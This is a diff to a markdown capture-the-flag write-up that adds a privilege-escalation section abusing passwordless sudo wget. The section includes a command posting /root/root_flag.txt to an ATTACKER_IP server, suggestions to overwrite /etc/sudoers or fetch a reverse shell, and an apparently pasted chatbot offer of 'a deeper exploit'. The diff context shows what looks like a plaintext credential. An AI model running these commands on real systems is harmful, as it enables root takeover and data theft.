@@ -472,6 +472,53 @@ skyfuck:8730281lkjlkjdqlksalks
 
 ## Privilege Escalation
 
+
+<details>
+  <summary>
+    
+### Privilege Escalation via `sudo wget` Exploitation
+    
+  </summary>
+
+
+#### **1. Checking Sudo Permissions**  
+- Ran `sudo -l` and found:  
+  ```bash
+  User jessie may run: (root) NOPASSWD: /usr/bin/wget
+  ```
+  → **`wget` can be executed as root without a password.**  
+
+#### **2. Exploiting `wget` to Read Root Files**  
+- **Method 1**: Directly read `/root/root_flag.txt`:  
+  ```bash
+  sudo wget -i /root/root_flag.txt  # Uses `-i` to read the file
+  ```
+- **Method 2**: Exfiltrate the file via HTTP (if `-i` fails):  
+  ```bash
+  sudo wget --post-file=/root/root_flag.txt http://ATTACKER_IP:8000
+  ```
+  → **Check HTTP server logs for the flag.**  
+
+#### **3. Why This Works**  
+- **GTFOBins**: `wget` with `sudo` can read arbitrary files (`-i` or `--post-file`).  
+- **No Password**: `NOPASSWD` allows privilege escalation without authentication.  
+
+#### **4. Mitigation**  
+- **Restrict `sudo`**: Avoid `NOPASSWD` for commands like `wget`.  
+- **Audit**: Regularly check `sudo -l` for all users.  
+
+**Impact**: Critical (root access via file read/write).  
+**Tool Reference**: [GTFOBins: wget](https://gtfobins.github.io/gtfobins/wget/).  
+
+--- 
+
+**Next Steps**:  
+- Try **writing files** (e.g., `/etc/sudoers`) for a full root shell.  
+- Use `sudo wget` to fetch and execute a reverse shell script.  
+
+Need a deeper exploit? Let me know! 🔥
+</details>
+
 <details>
   <summary>
   Privilege Escalation via Misconfigured setuid Binary (systemctl)
